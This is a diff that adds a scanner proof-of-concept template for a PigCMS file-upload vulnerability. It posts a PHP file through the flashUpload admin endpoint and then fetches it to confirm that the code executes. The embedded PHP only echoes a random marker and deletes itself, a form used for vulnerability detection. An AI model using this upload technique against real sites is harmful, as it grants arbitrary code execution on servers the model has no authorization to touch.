@@ -1,0 +1,37 @@
+name: poc-yaml-pigcms-action-flashupload-fileupload
+transport: http
+set:
+  r1: randomLowercase(20)
+  r2: randomLowercase(20)
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /cms/manage/admin.php?&m=manage&c=background&a=action_flashUpload
+      follow_redirects: false
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: |-
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="filePath"; filename="{{r1}}.php"
+        Content-Type: video/x-flv
+
+        <?php echo "{{r2}}";unlink(__FILE__);?>
+        ------WebKitFormBoundary{{rboundary}}--
+    expression: '"MAIN_URL_ROOT/.*?php".matches(response.body_string)'
+    output:
+      search: |
+        "MAIN_URL_ROOT/(?P<filename>.*?).php".bsubmatch(response.body)
+      uploadfilename: search["filename"]
+  r1:
+    request:
+      method: GET
+      path: /cms/{{uploadfilename}}.php
+      follow_redirects: false
+    expression: response.status == 200 && response.body_string.contains(r2)
+expression: r0() && r1()
+detail:
+  author: h1ei1
+  links:
+    - https://xz.aliyun.com/t/10470
